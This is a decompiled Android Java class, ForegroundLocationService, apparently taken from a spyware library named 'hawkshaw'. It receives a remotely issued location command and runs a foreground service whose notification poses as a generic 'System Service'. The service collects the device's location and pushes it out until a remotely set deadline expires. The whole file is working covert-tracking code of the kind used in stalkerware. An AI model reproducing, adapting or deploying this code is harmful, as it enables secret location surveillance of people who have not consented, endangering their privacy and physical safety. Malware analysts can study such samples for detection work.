package com.hawkshaw.library.features.location;

import F3.b;
import O.c;
import W2.e;
import W2.l;
import Y1.J;
import Y1.K;
import a3.j;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import androidx.lifecycle.V;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.models.Location;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.utils.NotificationKt;
import j3.f;
import java.util.concurrent.CancellationException;
import t3.N;
import t3.f0;
import w3.w;

public final class ForegroundLocationService extends Service {
    public static final Companion Companion = new Companion((f) null);
    public static final String KEY_LOCATION_REQUEST = "location_request";
    private static final int NOTIFICATION_ID = 101;
    private static final String TAG = "ForegroundLocationService";
    private f0 cancelUpdateJob;
    /* access modifiers changed from: private */
    public long expirationDuration = 300000;
    private final e fusedLocation$delegate = new l(new V(this, 6));
    /* access modifiers changed from: private */
    public final i3.l locationCallback = new c(this, 1);

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    private final FusedLocation getFusedLocation() {
        return (FusedLocation) this.fusedLocation$delegate.getValue();
    }

    private final Notification getNotification() {
        Notification build = NotificationKt.getNotification$default("Location service", "System Service", (Intent) null, (Context) null, 12, (Object) null).setWhen(System.currentTimeMillis()).build();
        K.m(build, "build(...)");
        return build;
    }

    /* access modifiers changed from: private */
    public final void pushLocation(Location location) {
        CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new a(location, (a3.e) null), 1, (Object) null);
    }

    private final void startCancelUpdatesJob() {
        f0 f0Var = this.cancelUpdateJob;
        if (f0Var != null) {
            f0Var.e((CancellationException) null);
        }
        this.cancelUpdateJob = CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new b(this, (a3.e) null), 1, (Object) null);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        Logger.d$default(Logger.INSTANCE, TAG, "Location service destroying", false, 4, (Object) null);
        f0 f0Var = this.cancelUpdateJob;
        if (f0Var != null) {
            f0Var.e((CancellationException) null);
        }
        this.cancelUpdateJob = null;
        getFusedLocation().stopLocationUpdates();
        stopForeground(1);
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i5, int i6) {
        String stringExtra;
        Logger.d$default(Logger.INSTANCE, TAG, "Location service started", false, 4, (Object) null);
        if (!(intent == null || (stringExtra = intent.getStringExtra(KEY_LOCATION_REQUEST)) == null)) {
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            Command.GetLocationRequest getLocationRequest = (Command.GetLocationRequest) json.a(w.n(Command.GetLocationRequest.Companion.serializer()), stringExtra);
            if (getLocationRequest != null) {
                startForeground(NOTIFICATION_ID, getNotification());
                startCancelUpdatesJob();
                getFusedLocation().checkAndRequestLocationUpdates(getLocationRequest);
                this.expirationDuration = getLocationRequest.getExpirationDuration();
            }
        }
        return 2;
    }
}
